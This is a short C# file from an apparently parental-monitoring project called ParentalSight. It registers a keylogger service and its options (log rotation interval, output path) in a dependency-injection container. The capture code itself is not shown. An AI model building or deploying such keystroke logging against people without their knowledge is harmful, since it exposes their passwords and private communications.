namespace ParentalSight.Core
{
    using Microsoft.Extensions.DependencyInjection;
    using ParentalSight.Core.Keylogger;
    using System;

    public static class KeyloggerBuilderExtensions
    {
        public static IServiceCollection AddKeylogger(this IServiceCollection services, long logRotationInMilliseconds, string outputPath)
        {
            if (logRotationInMilliseconds is default(long))
                throw new ArgumentException(nameof(logRotationInMilliseconds));
            if (string.IsNullOrEmpty(outputPath))
                throw new ArgumentException(nameof(outputPath));

            services.AddSingleton<IKeyloggerOptions>(new KeyloggerOptions(logRotationInMilliseconds, outputPath));
            services.AddTransient<IKeyloggerService, KeyloggerService>();

            return services;
        }
    }
}